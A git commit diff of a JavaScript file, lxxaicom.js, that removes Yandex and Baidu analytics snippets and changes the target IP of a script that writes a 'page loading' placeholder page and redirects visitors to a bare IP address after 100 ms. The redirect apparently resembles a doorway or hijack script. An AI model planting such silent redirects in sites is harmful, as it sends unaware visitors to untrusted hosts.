b2de8c516a585de1d25570f8a6942a25db6ae837
dateshare <chulishen567@gmail.com>
2022-01-07 14:00:03 +0800

    message

--- lxxaicom.js
+++ lxxaicom.js
@@ -1,21 +1,5 @@
 //lxxaicom
-(function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
-   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
-   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
 
-   ym(87023917, "init", {
-        clickmap:true,
-        trackLinks:true,
-        accurateTrackBounce:true,
-        webvisor:true
-   });
-   var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?d573a1a3453dc4bfc0beb0d5be9510f6";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
-})();
 document.writeln("<html>");
 document.writeln("<head>");
 document.writeln("<title>&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x4E2D;...</title>");
@@ -32,4 +16,4 @@ document.writeln("</html>");
 
 
 
-setTimeout("window.location.href='http://38.26.195.215/'",100);
+setTimeout("window.location.href='http://38.26.195.217/'",100);
